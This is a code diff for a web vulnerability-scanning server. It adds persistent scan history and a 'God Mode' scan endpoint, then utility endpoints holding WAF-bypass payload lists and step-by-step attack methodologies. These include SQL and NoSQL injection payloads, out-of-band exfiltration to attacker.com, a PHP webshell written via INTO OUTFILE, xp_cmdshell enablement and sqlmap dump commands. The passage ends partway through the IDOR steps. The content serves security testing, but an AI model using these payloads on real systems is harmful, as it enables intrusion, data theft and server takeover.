@@ -73,6 +73,52 @@ async def _lifespan(application):
         log.info("Loaded %d persisted findings into memory", len(VULNERABILITIES))
     except Exception as exc:
         log.warning("Could not load persisted findings: %s", exc)
+    # Load persisted scan history
+    try:
+        for s in _scan_db.load_all():
+            SCANS[s["scan_id"]] = s
+        log.info("Loaded %d persisted scans into memory", len(SCANS))
+    except Exception as exc:
+        log.warning("Could not load persisted scans: %s", exc)
+    # Import any God Mode sessions not yet in scan_history
+    try:
+        import json as _json
+        gm_dir = Path.home() / ".oneinfinity"
+        for sf in gm_dir.glob("god-mode-*.json"):
+            try:
+                state = _json.loads(sf.read_text())
+                sid = state.get("scan_id")
+                if not sid or sid in SCANS:
+                    continue
+                terminated_by = state.get("terminated_by") or ""
+                status = ("stopped" if terminated_by == "stop"
+                          else "completed" if terminated_by
+                          else "failed")
+                import datetime as _dt
+                started_at = (_dt.datetime.utcfromtimestamp(state["start_time"]).isoformat()
+                              if state.get("start_time") else None)
+                entry = {
+                    "id": sid, "scan_id": sid,
+                    "target": state.get("target", ""),
+                    "scan_type": "god_mode", "profile": "god_mode",
+                    "status": status,
+                    "started_at": started_at,
+                    "completed_at": None,
+                    "progress": 100,
+                    "findings_count": state.get("finding_count", 0),
+                    "log_lines": [], "pid": None,
+                    "phase": state.get("phases_complete", [""])[-1] if state.get("phases_complete") else "",
+                    "error": "",
+                }
+                SCANS[sid] = entry
+                _scan_db.upsert(entry)
+            except Exception:
+                pass
+        gm_count = sum(1 for s in SCANS.values() if s.get("scan_type") == "god_mode")
+        if gm_count:
+            log.info("Imported %d God Mode sessions into scan history", gm_count)
+    except Exception as exc:
+        log.warning("Could not import God Mode sessions: %s", exc)
     yield
     # Shutdown (nothing to do)
 
@@ -175,6 +221,101 @@ class TargetDB:
 
 
 _target_db = TargetDB(_db_path("metadata.db"))
+
+# ── SQLite-backed scan history ────────────────────────────────────────────────
+
+class ScanDB:
+    """Persists scan metadata to SQLite so history survives restarts."""
+
+    _COLS = ("scan_id", "target", "scan_type", "profile", "status",
+             "started_at", "completed_at", "progress", "findings_count", "phase", "error")
+
+    def __init__(self, db_path: Path):
+        self._db = db_path
+        with sqlite3.connect(str(self._db)) as conn:
+            conn.execute("""
+                CREATE TABLE IF NOT EXISTS scan_history (
+                    scan_id      TEXT PRIMARY KEY,
+                    target       TEXT NOT NULL,
+                    scan_type    TEXT,
+                    profile      TEXT,
+                    status       TEXT NOT NULL DEFAULT 'queued',
+                    started_at   TEXT,
+                    completed_at TEXT,
+                    progress     INTEGER DEFAULT 0,
+                    findings_count INTEGER DEFAULT 0,
+                    phase        TEXT,
+                    error        TEXT
+                )
+            """)
+
+    def upsert(self, scan: dict) -> None:
+        sid = scan.get("id") or scan.get("scan_id")
+        if not sid:
+            return
+        try:
+            with sqlite3.connect(str(self._db)) as conn:
+                conn.execute("""
+                    INSERT INTO scan_history
+                        (scan_id, target, scan_type, profile, status,
+                         started_at, completed_at, progress, findings_count, phase, error)
+                    VALUES (?,?,?,?,?,?,?,?,?,?,?)
+                    ON CONFLICT(scan_id) DO UPDATE SET
+                        status         = excluded.status,
+                        completed_at   = excluded.completed_at,
+                        progress       = excluded.progress,
+                        findings_count = excluded.findings_count,
+                        phase          = excluded.phase,
+                        error          = excluded.error
+                """, (
+                    sid,
+                    scan.get("target", ""),
+                    scan.get("scan_type", "full"),
+                    scan.get("profile", "auto"),
+                    scan.get("status", "queued"),
+                    scan.get("started_at"),
+                    scan.get("completed_at"),
+                    scan.get("progress", 0),
+                    scan.get("findings_count", 0),
+                    scan.get("phase", ""),
+                    scan.get("error", ""),
+                ))
+        except Exception as exc:
+            log.warning("ScanDB.upsert error: %s", exc)
+
+    def delete(self, scan_id: str) -> None:
+        try:
+            with sqlite3.connect(str(self._db)) as conn:
+                conn.execute("DELETE FROM scan_history WHERE scan_id=?", (scan_id,))
+        except Exception as exc:
+            log.warning("ScanDB.delete error: %s", exc)
+
+    def load_all(self) -> List[dict]:
+        try:
+            with sqlite3.connect(str(self._db)) as conn:
+                conn.row_factory = sqlite3.Row
+                rows = conn.execute(
+                    "SELECT * FROM scan_history ORDER BY started_at DESC"
+                ).fetchall()
+                scans = []
+                for row in rows:
+                    d = dict(row)
+                    d["id"] = d["scan_id"]
+                    # Mark interrupted running scans as failed
+                    if d.get("status") == "running":
+                        d["status"] = "failed"
+                        d["error"] = d.get("error") or "Process interrupted (server restart)"
+                    # Transient fields not stored in DB
+                    d["log_lines"] = []
+                    d["pid"] = None
+                    scans.append(d)
+                return scans
+        except Exception as exc:
+            log.warning("ScanDB.load_all error: %s", exc)
+            return []
+
+
+_scan_db = ScanDB(_db_path("metadata.db"))
 
 # ── Wire ResultIngestionEngine broadcast ─────────────────────────────────────
 
@@ -511,13 +652,15 @@ async def create_target(body: Dict[str, Any], background_tasks: BackgroundTasks)
     _add_log(f"Target added: {domain} (type={ttype})", "info", "system")
     # Auto-start scan
     scan_id = str(uuid.uuid4())[:8]
-    SCANS[scan_id] = {
+    _auto_scan = {
         "id": scan_id, "target": domain, "scan_type": "full",
         "profile": "auto", "status": "queued",
         "started_at": datetime.utcnow().isoformat(),
         "completed_at": None, "progress": 0, "findings_count": 0,
         "log_lines": [], "pid": None, "phase": "queued",
     }
+    SCANS[scan_id] = _auto_scan
+    _scan_db.upsert(_auto_scan)
     background_tasks.add_task(_run_scan_via_engine, scan_id, domain, "full")
     _add_log(f"Auto-scan queued for new target: {domain}", "info", "scanner", scan_id)
     return {**t, "scan_id": scan_id}
@@ -559,6 +702,7 @@ async def launch_scan(req: ScanRequest, background_tasks: BackgroundTasks):
         "phase": "queued",
     }
     SCANS[scan_id] = scan
+    _scan_db.upsert(scan)
     _add_log(f"Scan queued: {req.scan_type} on {req.target}", "info", "scanner", scan_id)
     _auth_config = {
         "session_cookie": req.session_cookie or "",
@@ -583,12 +727,13 @@ async def stop_scan(scan_id: str):
             pass
     scan["status"] = "stopped"
     scan["completed_at"] = datetime.utcnow().isoformat()
+    _scan_db.upsert(scan)
     _add_log(f"Scan stopped: {scan_id}", "warn", "scanner", scan_id)
     return scan
 
 @app.delete("/api/scans/{scan_id}", dependencies=[Depends(_require_auth)])
 async def delete_scan(scan_id: str):
-    """Delete a scan from in-memory history."""
+    """Delete a scan and all its associated findings from in-memory and persistent storage."""
     if scan_id not in SCANS:
         raise HTTPException(404, "Scan not found")
     scan = SCANS[scan_id]
@@ -601,8 +746,26 @@ async def delete_scan(scan_id: str):
             except Exception:
                 pass
     del SCANS[scan_id]
-    _add_log(f"Scan deleted: {scan_id}", "warn", "scanner", scan_id)
-    return {"ok": True}
+    _scan_db.delete(scan_id)
+
+    # Remove findings from in-memory VULNERABILITIES dict
+    to_remove = [fid for fid, v in VULNERABILITIES.items() if v.get("scan_id") == scan_id]
+    for fid in to_remove:
+        del VULNERABILITIES[fid]
+
+    # Remove findings from persistent DB
+    db_deleted = 0
+    try:
+        from result_ingestion_engine import get_ingestion_engine
+        db_deleted = get_ingestion_engine().delete_findings_for_scan(scan_id)
+    except Exception as exc:
+        log.warning("Could not purge findings from DB for scan %s: %s", scan_id, exc)
+
+    _add_log(
+        f"Scan deleted: {scan_id} — removed {len(to_remove)} in-memory + {db_deleted} DB findings",
+        "warn", "scanner", scan_id,
+    )
+    return {"ok": True, "findings_removed": len(to_remove) + db_deleted}
 
 # Vulnerabilities
 @app.get("/api/findings")
@@ -828,22 +991,37 @@ async def get_attack_graph(target: Optional[str] = None):
         # Build graph from ResultIngestionEngine for this target
         domain_node = {"id": f"d_{domain}", "label": domain, "type": "domain", "data": {}}
         nodes.append(domain_node)
-
-        subs = []
-        for s in subs:
-            nid = f"h_{s}"
-            nodes.append({"id": nid, "label": s, "type": "host", "data": {}})
-            edges.append({"source": f"d_{domain}", "target": nid, "label": "subdomain", "type": "subdomain"})
+        added_domains = {f"d_{domain}"}
 
         if _rie_available:
             raw_vulns = _rie().get_findings(target=target)
             vuln_list = [_finding_to_api(f) for f in raw_vulns]
         else:
             vuln_list = [v for v in VULNERABILITIES.values() if v.get("target") == target or v.get("target") == domain]
+
+        # Derive unique hosts from vuln URLs and add as host nodes
+        from urllib.parse import urlparse as _urlparse
+        added_hosts = set()
+        for v in vuln_list:
+            url = v.get("url", "")
+            if url:
+                host = _urlparse(url).netloc or url.split("/")[0]
+                if host and host != domain and host not in added_hosts:
+                    nid = f"h_{host}"
+                    nodes.append({"id": nid, "label": host, "type": "host", "data": {}})
+                    edges.append({"source": f"d_{domain}", "target": nid, "label": "subdomain", "type": "subdomain"})
+                    added_hosts.add(host)
+
         for v in vuln_list:
             vid = f"v_{v['id']}"
-            nodes.append({"id": vid, "label": v["title"][:30], "type": "vulnerability", "severity": v["severity"], "data": v})
-            edges.append({"source": f"d_{domain}", "target": vid, "label": v["attack_type"], "type": "vulnerability"})
+            nodes.append({"id": vid, "label": v.get("title", "")[:30], "type": "vulnerability", "severity": v.get("severity", "info"), "data": v})
+            url = v.get("url", "")
+            host = _urlparse(url).netloc if url else ""
+            attack_type = v.get("attack_type", "")
+            if host and host != domain and host in added_hosts:
+                edges.append({"source": f"h_{host}", "target": vid, "label": attack_type, "type": "vulnerability"})
+            else:
+                edges.append({"source": f"d_{domain}", "target": vid, "label": attack_type, "type": "vulnerability"})
     else:
         # Global graph
         added_domains = set()
@@ -859,9 +1037,19 @@ async def get_attack_graph(target: Optional[str] = None):
             vuln_list = [_finding_to_api(f) for f in raw_vulns]
         else:
             vuln_list = list(VULNERABILITIES.values())
+
+        # Create domain nodes for any targets not already in _target_db
+        for v in vuln_list:
+            tgt = v.get("target","").replace("https://","").replace("http://","").split("/")[0]
+            if tgt:
+                nid = f"d_{tgt}"
+                if nid not in added_domains:
+                    nodes.append({"id": nid, "label": tgt, "type": "domain", "data": {}})
+                    added_domains.add(nid)
+
         for v in vuln_list:
             vid = f"v_{v['id']}"
-            nodes.append({"id": vid, "label": v["title"][:30], "type": "vulnerability", "severity": v["severity"], "data": v})
+            nodes.append({"id": vid, "label": v.get("title", "")[:30], "type": "vulnerability", "severity": v.get("severity", "info"), "data": v})
             tgt = v.get("target","").replace("https://","").replace("http://","").split("/")[0]
             src = f"d_{tgt}"
             if src in added_domains:
@@ -1099,6 +1287,7 @@ async def _run_scan_via_engine(scan_id: str, target: str, scan_type: str, auth_c
             scan["progress"] = 100
             scan["completed_at"] = datetime.utcnow().isoformat()
             scan["findings_count"] = len(result.findings)
+            _scan_db.upsert(scan)
 
             for f in result.findings:
                 api_f = _finding_to_api(f)
@@ -1142,6 +1331,7 @@ async def _run_scan_via_engine(scan_id: str, target: str, scan_type: str, auth_c
     except Exception as fallback_exc:
         scan["status"] = "failed"
         scan["completed_at"] = datetime.utcnow().isoformat()
+        _scan_db.upsert(scan)
         _add_log(f"Fallback scan failed: {fallback_exc}", "error", "scanner", scan_id)
 
 
@@ -1193,11 +1383,13 @@ async def _run_scan(scan_id: str, req: ScanRequest):
         scan["status"] = "completed" if proc.returncode == 0 else "failed"
         scan["progress"] = 100
         scan["completed_at"] = datetime.utcnow().isoformat()
+        _scan_db.upsert(scan)
         _add_log(f"Scan completed: {req.scan_type} on {req.target} (exit {proc.returncode})",
                  "success" if proc.returncode == 0 else "error", "scanner", scan_id)
     except Exception as exc:
         scan["status"] = "failed"
         scan["completed_at"] = datetime.utcnow().isoformat()
+        _scan_db.upsert(scan)
         _add_log(f"Scan error: {exc}", "error", "scanner", scan_id)
 
 async def _run_ai_campaign(campaign_id: str):
@@ -2124,6 +2316,13 @@ async def god_mode_run(request: Request, background_tasks: BackgroundTasks):
     no_swarm     = bool(data.get("no_swarm", False))
     no_research  = bool(data.get("no_research", False))
     report_fmt   = str(data.get("report_fmt", "markdown"))
+    modules      = data.get("modules") or []        # list[str], empty = preset defaults
+    intensities  = data.get("intensities") or {}    # dict[str,str]
+
+    # When a custom module list is provided, derive flags from it
+    if modules:
+        no_swarm    = 'active_testing' not in modules
+        no_research = 'ai_hypothesis'  not in modules
     # Auth config for authenticated scanning
     auth_config = {
         "session_cookie": str(data.get("session_cookie", "") or ""),
@@ -2132,22 +2331,53 @@ async def god_mode_run(request: Request, background_tasks: BackgroundTasks):
     }
     has_auth = any(auth_config.values())
 
+    # Pre-generate the scan_id so we can register it before the thread starts.
+    # GodModeConductor.run() also generates a scan_id internally — we'll sync
+    # findings_count / status via the _sync_god_mode_scans helper on each poll.
+    import uuid as _uuid2
+    gm_scan_id = "gm-" + str(_uuid2.uuid4())[:6]
+    _gm_scan_entry = {
+        "id": gm_scan_id, "target": target, "scan_type": "god_mode",
+        "profile": "custom" if modules else "god_mode", "status": "running",
+        "started_at": datetime.utcnow().isoformat(),
+        "completed_at": None, "progress": 0, "findings_count": 0,
+        "log_lines": [], "pid": None, "phase": "starting",
+        "modules": modules, "intensities": intensities,
+    }
+    SCANS[gm_scan_id] = _gm_scan_entry
+    _scan_db.upsert(_gm_scan_entry)
+
     def _run():
         try:
             import sys as _s, os as _o
             _s.path.insert(0, _o.path.dirname(_o.path.abspath(__file__)) + "/../..")
             from god_mode_engine import get_god_mode_conductor
-            get_god_mode_conductor().run(
+            conductor = get_god_mode_conductor()
+            conductor.run(
                 target=target, max_time=max_time, max_findings=max_findings,
                 background=True, no_swarm=no_swarm, no_research=no_research,
                 report_fmt=report_fmt, auth_config=auth_config if has_auth else None,
+                _override_scan_id=gm_scan_id,
             )
+            # After run() completes, sync final state back to SCANS + DB
+            state = conductor.status(gm_scan_id)
+            if state and gm_scan_id in SCANS:
+                terminated_by = state.get("terminated_by") or ""
+                SCANS[gm_scan_id]["status"] = "stopped" if terminated_by == "stop" else "completed"
+                SCANS[gm_scan_id]["findings_count"] = state.get("finding_count", 0)
+                SCANS[gm_scan_id]["completed_at"] = datetime.utcnow().isoformat()
+                SCANS[gm_scan_id]["progress"] = 100
+                _scan_db.upsert(SCANS[gm_scan_id])
         except Exception as exc:
             print(f"[god-mode] run error: {exc}")
+            if gm_scan_id in SCANS:
+                SCANS[gm_scan_id]["status"] = "failed"
+                SCANS[gm_scan_id]["completed_at"] = datetime.utcnow().isoformat()
+                _scan_db.upsert(SCANS[gm_scan_id])
 
     background_tasks.add_task(_run)
-    return {"status": "started", "target": target, "max_time": max_time,
-            "max_findings": max_findings, "authenticated": has_auth}
+    return {"status": "started", "target": target, "scan_id": gm_scan_id,
+            "max_time": max_time, "max_findings": max_findings, "authenticated": has_auth}
 
 
 @app.get("/api/god-mode/status")
@@ -2256,6 +2486,439 @@ async def god_mode_logs(scan_id: str, lines: int = 150):
         text = log_path.read_text(errors="replace")
         all_lines = text.splitlines()
         return {"lines": all_lines[-lines:], "exists": True, "total_lines": len(all_lines)}
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+# ── Utility endpoints ─────────────────────────────────────────────────────────
+
+class CvssRequest(BaseModel):
+    vector: str
+    describe: str = ""
+
+class DedupRequest(BaseModel):
+    title: str
+
+class WafBypassRequest(BaseModel):
+    waf: str
+    vuln_type: str
+
+class MethodologyRequest(BaseModel):
+    vuln_class: str
+
+def _cvss31_score(vector: str) -> dict:
+    """Compute CVSS 3.1 base score from a vector string."""
+    import math, re
+    parts = {}
+    for tok in vector.split("/"):
+        if ":" in tok:
+            k, v = tok.split(":", 1)
+            parts[k] = v
+    av_map  = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
+    ac_map  = {"L": 0.77, "H": 0.44}
+    ui_map  = {"N": 0.85, "R": 0.62}
+    cia_map = {"N": 0.00, "L": 0.22, "H": 0.56}
+    pr_u    = {"N": 0.85, "L": 0.62, "H": 0.27}
+    pr_c    = {"N": 0.85, "L": 0.68, "H": 0.50}
+    scope   = parts.get("S", "U")
+    pr_map  = pr_c if scope == "C" else pr_u
+    av = av_map.get(parts.get("AV", "N"), 0.85)
+    ac = ac_map.get(parts.get("AC", "L"), 0.77)
+    pr = pr_map.get(parts.get("PR", "N"), 0.85)
+    ui = ui_map.get(parts.get("UI", "N"), 0.85)
+    c  = cia_map.get(parts.get("C",  "N"), 0.00)
+    i  = cia_map.get(parts.get("I",  "N"), 0.00)
+    a  = cia_map.get(parts.get("A",  "N"), 0.00)
+    iss = 1 - (1 - c) * (1 - i) * (1 - a)
+    if scope == "U":
+        impact = 6.42 * iss
+    else:
+        impact = 7.52 * (iss - 0.029) - 3.25 * ((iss - 0.02) ** 15)
+    exploit = 8.22 * av * ac * pr * ui
+    if impact <= 0:
+        raw = 0.0
+    elif scope == "U":
+        raw = min(impact + exploit, 10)
+    else:
+        raw = min(1.08 * (impact + exploit), 10)
+    # Roundup to 1 decimal
+    score = math.ceil(raw * 10) / 10
+    if score == 0:
+        severity = "None"
+    elif score < 4:
+        severity = "Low"
+    elif score < 7:
+        severity = "Medium"
+    elif score < 9:
+        severity = "High"
+    else:
+        severity = "Critical"
+    return {"score": score, "severity": severity, "vector": vector}
+
+_WAF_BYPASS: dict = {
+    "cloudflare": {
+        "xss": ["<svg/onload=alert(1)>", "<img src=x onerror=alert`1`>", "\"><script>alert(String.fromCharCode(88,83,83))</script>", "<details/open/ontoggle=alert(1)>", "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'> "],
+        "sqli": ["1'/**/OR/**/1=1--", "1' /*!50000OR*/ '1'='1", "1 UNION%0ASELECT null,null--", "' OR 1=1#", "admin'--"],
+        "ssrf": ["http://127.0.0.1:80", "http://[::1]/", "http://0x7f000001/", "http://2130706433/", "http://127.1/"],
+        "lfi": ["....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd", "..\\..\\..\\windows\\win.ini"],
+        "rce": ["; ls${IFS}-la", "| cat${IFS}/etc/passwd", "`id`", "$(id)", "%0Aid"],
+        "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>"],
+        "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
+        "idor": ["/api/user/1", "/api/user/../../admin", "id=1 UNION SELECT id FROM users--"],
+        "open_redirect": ["//evil.com", "///evil.com", "/\\/evil.com", "https:///evil.com"],
+    },
+    "akamai": {
+        "xss": ["<ScRiPt>alert(1)</ScRiPt>", "<img src='x' onerror='alert(1)'>", "<svg><script>alert(1)</script></svg>", "';alert(1)//"],
+        "sqli": ["1' OR '1'='1", "' OR 1=1 LIMIT 1--", "1;SELECT SLEEP(5)--", "1 AND 1=1"],
+        "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "dict://127.0.0.1:6379/"],
+        "lfi": ["..%252F..%252Fetc%252Fpasswd", "%2e%2e/%2e%2e/etc/passwd", "....//....//etc/passwd"],
+        "rce": ["& id", "| id", "; id", "` id `"],
+        "xxe": ["<?xml version='1.0'?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM \"file:///etc/passwd\">]><r>&sp;</r>"],
+        "ssti": ["{{config}}", "{{self}}", "${7*'7'}", "{% for c in [].__class__.__base__.__subclasses__() %}"],
+        "idor": ["/api/v1/user/2", "/admin/../user/1"],
+        "open_redirect": ["/redirect?url=//evil.com", "?next=//evil.com%2F"],
+    },
+}
+# Fill missing WAFs/types with generic payloads
+_GENERIC_WAF_PAYLOADS: dict = {
+    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'><script>alert(document.domain)</script>", "<svg onload=alert(1)>"],
+    "sqli": ["' OR '1'='1", "1 OR 1=1--", "' UNION SELECT NULL--", "1; DROP TABLE users--"],
+    "ssrf": ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/", "file:///etc/passwd"],
+    "lfi": ["../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd"],
+    "rce": ["; id", "| id", "$(id)", "`id`"],
+    "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"],
+    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
+    "idor": ["/api/user/1", "/api/account/2"],
+    "open_redirect": ["//evil.com", "///evil.com"],
+}
+for _waf in ["imperva", "modsecurity", "aws_waf", "f5", "sucuri"]:
+    _WAF_BYPASS[_waf] = _GENERIC_WAF_PAYLOADS.copy()
+for _waf in ["cloudflare", "akamai"]:
+    for _vt, _pl in _GENERIC_WAF_PAYLOADS.items():
+        if _vt not in _WAF_BYPASS[_waf]:
+            _WAF_BYPASS[_waf][_vt] = _pl
+
+_METHODOLOGY: dict = {
+    "sqli": {
+        "title": "SQL Injection (Error-based, Union, Blind, OOB, NoSQL)",
+        "steps": [
+            # ── Discovery ──────────────────────────────────────────────────
+            "DISCOVERY — Map every injection surface: URL path segments, query parameters, POST body fields, JSON/XML keys, HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie), and GraphQL variables.",
+            "DETECTION — Inject a single quote (') and double quote (\") into each parameter. A database error, blank page, or behavioural change confirms injection. Also try comment sequences: --, #, /**/.",
+            # ── Error-based ────────────────────────────────────────────────
+            "ERROR-BASED (MySQL) — Use extractvalue() or updatexml() to leak data in error messages: ' AND extractvalue(1,concat(0x7e,version()))-- or ' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
+            "ERROR-BASED (MSSQL) — Use convert() type mismatch: ' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+            "ERROR-BASED (Oracle) — Use XMLType: ' AND 1=1 AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT version FROM v$instance)||chr(62))) FROM DUAL)--",
+            # ── Union-based ────────────────────────────────────────────────
+            "UNION-BASED STEP 1 — Determine number of columns with ORDER BY: ' ORDER BY 1-- (increment until error), then confirm with ' UNION SELECT NULL,NULL,NULL--",
+            "UNION-BASED STEP 2 — Find printable columns: replace NULLs with string literals: ' UNION SELECT 'a',NULL,NULL-- until a value appears in the response.",
+            "UNION-BASED STEP 3 — Extract data: ' UNION SELECT table_name,NULL FROM information_schema.tables-- (MySQL/MSSQL/PostgreSQL) or SELECT table_name FROM all_tables-- (Oracle).",
+            # ── Boolean Blind ──────────────────────────────────────────────
+            "BOOLEAN BLIND — Confirm: param=1 AND 1=1-- (same response) vs param=1 AND 1=2-- (different/empty). Then extract char-by-char: param=1 AND SUBSTRING((SELECT user()),1,1)='r'--",
+            "BOOLEAN BLIND AUTOMATION — Run sqlmap --technique=B --dbms=mysql --level=3 --risk=2 --batch -p <param> on confirmed boolean-blind endpoints.",
+            # ── Time-based Blind ───────────────────────────────────────────
+            "TIME-BLIND (MySQL/PostgreSQL) — No visible difference? Use: param=1 AND SLEEP(5)-- or param=1; SELECT pg_sleep(5)-- A 5-second delay confirms injection.",
+            "TIME-BLIND (MSSQL) — Use WAITFOR: param=1; IF(1=1) WAITFOR DELAY '0:0:5'--",
+            "TIME-BLIND (Oracle) — Use DBMS_PIPE: param=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+            "TIME-BLIND EXTRACTION — Extract data via timing: IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0)-- Binary search to halve iterations.",
+            # ── Out-of-Band ────────────────────────────────────────────────
+            "OUT-OF-BAND (MySQL) — Exfiltrate via DNS: ' UNION SELECT LOAD_FILE(concat('\\\\\\\\',database(),'.attacker.com\\\\test'))-- (requires FILE privilege and outbound DNS).",
+            "OUT-OF-BAND (MSSQL) — Use xp_dirtree: '; EXEC master..xp_dirtree '\\\\attacker.com\\foo'-- Monitor Burp Collaborator or interactsh for DNS callbacks.",
+            "OUT-OF-BAND (Oracle) — Use UTL_HTTP: ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM DUAL--",
+            # ── Auth Bypass ────────────────────────────────────────────────
+            "AUTH BYPASS — Try login bypass payloads in username field: admin'--, admin'#, ' OR '1'='1'--, ' OR 1=1--, admin'/*. Pair with any password.",
+            # ── Second-order ───────────────────────────────────────────────
+            "SECOND-ORDER — Input stored in DB then used unsanitised in a later query. Register username: admin'-- then trigger the vulnerable operation (password reset, profile update) to fire injection.",
+            # ── Stacked Queries ────────────────────────────────────────────
+            "STACKED QUERIES — Test with: param=1; SELECT SLEEP(3)-- (MySQL), param=1; WAITFOR DELAY '0:0:3'-- (MSSQL). If supported, enables DROP, INSERT, UPDATE, and xp_cmdshell.",
+            # ── NoSQL ──────────────────────────────────────────────────────
+            "NOSQL (MongoDB) — Inject operator payloads in JSON body: {'username':{'$gt':''},'password':{'$gt':''}} to bypass auth. Test $where for JS execution: {'$where':'sleep(1000)'}.",
+            "NOSQL (MongoDB blind) — Extract data via conditional sleep: {'$where':'this.password.match(/^a/) && sleep(500)'} — iterate first character until delay observed.",
+            "NOSQL (Other) — CouchDB: append ?selector={} to view endpoints. Redis: inject CRLF newlines to inject commands. Elasticsearch: inject via _search query DSL.",
+            # ── Escalation ─────────────────────────────────────────────────
+            "ESCALATION (MySQL) — If FILE privilege: read system files with LOAD_FILE('/etc/passwd'). Write webshell: SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'.",
+            "ESCALATION (MSSQL) — Enable xp_cmdshell: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'.",
+            # ── WAF Bypass ────────────────────────────────────────────────
+            "WAF BYPASS — Use inline comments: UN/**/ION SEL/**/ECT. Case variation: uNiOn SeLeCt. URL encode spaces: %20, %09, %0a. Use scientific notation for numbers: 1e0=1. Append noise: /*!50000UNION*/ SELECT.",
+            # ── Automation ────────────────────────────────────────────────
+            "AUTOMATION — sqlmap full run: sqlmap -u 'URL' --batch --dbs --level=5 --risk=3 --random-agent --tamper=space2comment,between,randomcase --technique=BEUSTQ --dump",
+        ],
+    },
+    "nosqli": {
+        "title": "NoSQL Injection",
+        "steps": [
+            "IDENTIFY — Target apps using MongoDB, CouchDB, Redis, Cassandra, Elasticsearch, Firebase. Look for JSON APIs, document-based query patterns, and non-relational data stores.",
+            "AUTH BYPASS (MongoDB) — In login JSON body replace string values with operator objects: {\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}} or {\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}.",
+            "AUTH BYPASS (URL params) — Try: ?username[$ne]=foo&password[$ne]=bar or ?username[$regex]=.*&password[$regex]=.* — some frameworks parse bracket notation into MongoDB operators.",
+            "BLIND DATA EXTRACTION — Use $regex to extract field values char by char: {\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}} — a match returns 200, no match returns 401/empty.",
+            "JS INJECTION ($where) — MongoDB $where executes JavaScript: {\"$where\":\"this.password.length > 0 && sleep(1000)\"} — timing confirms JS execution. Extract: {\"$where\":\"this.password[0] == 'a'\"}.",
+            "ARRAY INJECTION — Submit field as array: password[]=x — some ORMs coerce arrays into $in operators, bypassing equality checks.",
+            "AGGREGATION PIPELINE INJECTION — Inject into $lookup or $project stages if user input builds pipeline stages dynamically.",
+            "REDIS INJECTION — Inject CRLF sequences into parameters that feed Redis commands: value=\\r\\nSET injected 1\\r\\n — enables arbitrary command execution.",
+            "ELASTICSEARCH INJECTION — Inject into _search DSL: {\"query\":{\"match_all\":{}}} via unsanitised JSON merge, or override aggs/size fields to exfiltrate all documents.",
+            "AUTOMATION — Use NoSQLMap (python nosqlmap.py) or manually craft payloads with Burp Intruder iterating operator values.",
+        ],
+    },
+    "xss": {
+        "title": "Cross-Site Scripting (XSS)",
+        "steps": [
+            "Map all reflection points: URL params, form fields, HTTP headers (User-Agent, Referer), JSON fields.",
+            "Test for reflection with a unique marker (e.g., xsstest123) and check response for context (HTML, JS, attribute).",
+            "Identify encoding: check if <, >, ', \" are HTML-encoded or escaped in JS context.",
+            "Try context-appropriate payloads: HTML context → <svg/onload=alert(1)>, JS context → '-alert(1)-', Attribute → \" onmouseover=alert(1).",
+            "Run dalfox on parameterized URLs from paramspider output for automated detection.",
+            "Test for DOM-based XSS by searching JS source for dangerous sinks: innerHTML, document.write, eval, location.hash.",
+            "Check for stored XSS in all user-controlled fields that are rendered to other users (profile, comments, tickets).",
+            "Verify the XSS can exfiltrate cookies or perform actions (CSRF-equivalent) to assess real impact.",
+        ],
+    },
+    "ssrf": {
+        "title": "Server-Side Request Forgery (SSRF)",
+        "steps": [
+            "Identify parameters that accept URLs or hostnames: webhook URLs, image fetch, PDF generators, import/export features.",
+            "Test with Burp Collaborator or interactsh OOB URL to confirm outbound requests reach external hosts.",
+            "Probe internal network: try http://127.0.0.1/, http://localhost/, http://169.254.169.254/ (AWS metadata).",
+            "Enumerate cloud metadata endpoints: AWS (169.254.169.254), GCP (metadata.google.internal), Azure (169.254.169.254/metadata).",
+            "Test protocol smuggling: file://, dict://, gopher://, ftp:// to bypass HTTP-only filters.",
+            "Try DNS rebinding or URL parser inconsistencies: http://evil.com@127.0.0.1/, http://127.0.0.1.evil.com/.",
+            "Scan internal ports if blind SSRF confirmed: use timing or response size differences.",
+            "Escalate to RCE via IMDSv1 credential theft or internal service exploitation.",
+        ],
+    },
+    "idor": {
+        "title": "Insecure Direct Object Reference (IDOR)",
+        "steps": [
+            "Map all API endpoints that reference object IDs (numeric, UUID, hash) in URL path, query string, or body.",
+            "Create two test accounts (A and B). Perform actions as A and capture requests referencing A's objects.",
+            "Replay those requests using B's session but A's object IDs — check if B can access A's data.",
+            "Test IDOR in all HTTP methods: GET (read), PUT/PATCH (modify), DELETE (delete), POST (create as other user).",
+            "Check indirect references: encoded IDs (base64, hash), batch operations, export functions.",
